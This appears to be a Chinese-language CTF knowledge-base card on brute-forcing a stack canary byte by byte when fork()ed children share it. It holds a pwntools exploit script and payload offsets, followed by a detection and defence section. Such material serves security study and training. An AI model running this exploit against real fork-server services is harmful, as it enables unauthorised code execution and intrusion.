---
id: binary-pwn-stack-fork-canary-bytewise-bruteforce
title: fork 子进程共享 canary：逐字节爆破栈保护值绕过栈溢出
type: scenario
domain: binary
path: binary/pwn/stack
technique: fork-canary-bytewise-bruteforce
aliases:
- canary 爆破
- 逐字节爆破 canary
- fork canary 相同
- ezcanary
- funcanary
- stack smashing detected oracle
- 栈保护值爆破
tags:
- pwn
- stack
- canary
- bruteforce
- fork
- stack-overflow
- ctf
- linux
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V173
  verified_at: '2026-11-06T17:11:49+08:00'
  notes: 已对照原文核对：fork子进程继承canary、x64最低字节\x00后爆7字节、star smashing oracle、ezcanary偏移0x58与CISCN偏移0x68均与exp一致；两题均无flag成功截图，机制与exp完整
---

## 一句话结论

当程序用 `fork()` 为每个连接创建子进程且父进程不重新随机化栈保护值时，所有子进程继承同一份 canary；攻击者可以对 canary 逐字节尝试 256 种取值，用“猜错时子进程触发 `*** stack smashing detected ***` 退出、猜对时程序继续到下一轮提示”作为 oracle，最多 7×256 次（x64）即可还原完整 canary，再构造栈溢出 payload 覆盖返回地址。

## 原理

- **fork 复制内存**：`fork()` 创建的子进程是父进程地址空间的副本，栈上的 canary 也原样复制。只要父进程没有在每次 fork 后重新生成 canary（典型 `__libc_start_main` 只在启动时设置一次），所有子进程的 canary 完全相同。
- **canary 结构**：x86-64 的栈保护值通常 8 字节，最低字节固定为 `\x00`（防止字符串函数越界读取泄露），其余 7 字节随机；x86 为 4 字节，最低字节 `\x00`，剩 3 字节随机。攻击者从最低字节之后开始逐字节猜。
- **逐字节 oracle**：溢出 payload 写到 canary 前一个字节为止，再追加“已猜出的字节 + 当前候选字节”。如果候选错误，函数返回时 `__stack_chk_fail` 检测到 canary 被改，打印 `*** stack smashing detected ***` 并 `abort()`；如果候选正确，canary 保持完整，程序继续执行到下一次读入/提示。通过观察是否出现 smashing 信息（或连接是否继续返回提示）即可判断当前字节。
- **为什么必须逐字节而不是一次猜 8 字节**：canary 是随机的，一次猜中 7 字节的概率是 2^-56；逐字节把搜索空间降为 7×256，且每次猜测的反馈是确定性的（fork 子进程 canary 不变）。这是“把随机 secret 变成可查询 oracle”的典型降维。
- **收尾**：还原 canary 后，payload 结构为 `填充到 canary 前 + canary + 保存的 rbp（可选）+ 返回地址`。若程序有可直接调用的 `getshell`/`win` 函数，覆盖返回地址为该函数；否则继续构造 ROP。
- **前提**：程序每次请求都 fork 新子进程、父进程不 exec、不重新 seed canary；溢出点能精确控制写入长度并在 canary 前停住；错误候选导致的崩溃/提示可被区分。若程序使用 `fork` 后 `exec`、每次重新随机化或 canary 在 TLS 中按线程重新生成，则该方法失效。

## 触发条件

- Linux 程序使用 `fork()` 处理请求（fork server 模式），子进程继承父进程 canary。
- 存在栈缓冲区溢出，且溢出写入长度可控，能够逐字节写到 canary 位置。
- 程序对 canary 校验失败有可观察差异（`*** stack smashing detected ***`、连接关闭、无下一轮提示等）。
- 攻击者可发起多次连接/多次 fork；爆破次数可接受（x64 最坏 1792 次尝试）。
- 二进制无 PIE 或有地址泄露/可预测的 win 函数地址；否则还需额外泄露。

## 利用步骤

1. **确认 fork 模式**：反编译/调试确认主循环 `fork()`，子进程处理输入、父进程 `wait()`；用 gdb `set follow-fork-mode child` 跟随子进程。
2. **定位 canary 偏移**：在子进程读入函数下断点，`telescope $esp/$rsp` 或 `canary` 命令查看 canary 与缓冲区距离；x64 常见 `buf[0x60]` 到 `rbp-8`，偏移 0x58。
3. **确定 oracle**：发送 `填充 + 已知前缀 + 候选字节`，观察返回是否包含 `*** stack smashing detected ***`；若包含则错误，否则该字节正确。
4. **逐字节爆破**：从 `canary = b'\x00'` 开始，对第 1..7 个未知字节各尝试 0..255；每次猜测后重新连接/触发新 fork。注意每次错误后要消费掉父进程/子进程的提示，避免报文错位。
5. **拼接 canary**：7 字节全部命中后 `u64(canary)` 得到完整值；用调试器核对。
6. **构造 overflow**：`payload = b'A'*(offset) + p64(canary) + p64(0) + p64(win)`；若需 ROP，继续接 gadget 链。
7. **触发并验证**：发送 payload，观察 `getshell` 执行或 shell 回连；若失败，检查偏移、栈对齐与返回地址。

## PoC

逐字节爆破核心逻辑（x64，示意）：

```python
from pwn import *

io = process('./pwn')
canary = b'\x00'

def try_byte(idx):
    global canary
    for b in range(256):
        payload = b'A' * 0x58 + canary + p8(b)
        io.sendafter(b'input>\n', payload)
        line = io.recvline(timeout=1)
        if b'*** stack smashing detected ***' in line:
            io.sendline(b'n')      # 让父进程继续下一轮
            continue
        canary += p8(b)
        return
    raise RuntimeError('byte not found')

for i in range(7):
    try_byte(i)

payload = b'A' * 0x58 + canary + p64(0) + p64(0x401251)
io.sendafter(b'input>\n', payload)
io.interactive()
```

文章给出的 ezcanary 模板使用 `(0x60-8)*b'a' + canary + p8(i)`，并检查 `*** stack smashing detected ***`；2023 CISCN 版本用 `rt("welcome\n")` 同步每次 fork 的提示，payload 为 `b'a'*0x68 + canary + p8(i)`，最后 `b'a'*(0x70-8)+canary+b'a'*8+address`。两题的偏移不同，需按目标调试确定。

## 变体与关联

- 变体：canary 在 TLS 中按线程生成时，若目标用线程池而非 fork，canary 可能每个线程不同，爆破需绑定同一线程；若程序 `fork` 后 `exec`，canary 重新随机化，方法失效；也可用格式化字符串/信息泄露直接读 canary（见关联卡）。
- 关联：[[binary-pwn-format-string-canary-leak-ret2copy-authorized-keys]]、[[binary-pwn-format-string-canary-libc-leak-rop-system]]（泄露而非爆破）、[[binary-pwn-stack-tls-stack-guard-overwrite-canary-rop]]（TLS 栈保护值覆盖）、[[binary-pwn-stack-ret2syscall-32bit]]（爆破后的 ROP/ret2syscall 收尾）。
- Go 场景：Go 程序通常不使用 glibc canary，但 fork server + 栈溢出仍可能遇到类似问题（见 [[binary-pwn-stack-go-stack-overflow-rop]]）。

## 检测与防御

- **消除共享 canary**：fork 后在子进程重新生成 canary（如 `exec` 新程序、重新初始化 TLS canary），或改用每次请求独立进程并重新随机化；不要把 fork 子进程当作隔离。
- **减少 oracle**：不要在崩溃时打印 `*** stack smashing detected ***` 等明确信息；统一错误响应/直接关闭连接；对连接做速率限制，检测大量短连接与固定长度 payload。
- **编译缓解**：启用 `-fstack-protector-strong`/`-fstack-clash-protection`、PIE、FORTIFY_SOURCE；把危险拷贝改为带长度检查的安全函数。
- **运行时检测**：监控进程频繁 `abort`/`SIGABRT`、同一父进程大量 fork 子进程、固定长度请求；EDR/审计可关联 `__stack_chk_fail` 崩溃日志。
- **CTF 之外的现实性**：fork server 架构（如 CGI/fastcgi、老式网络服务）若共享 canary，同样可被逐字节爆破；评估时应把“崩溃 oracle + 可重复 fork”视为 canary 失效条件。
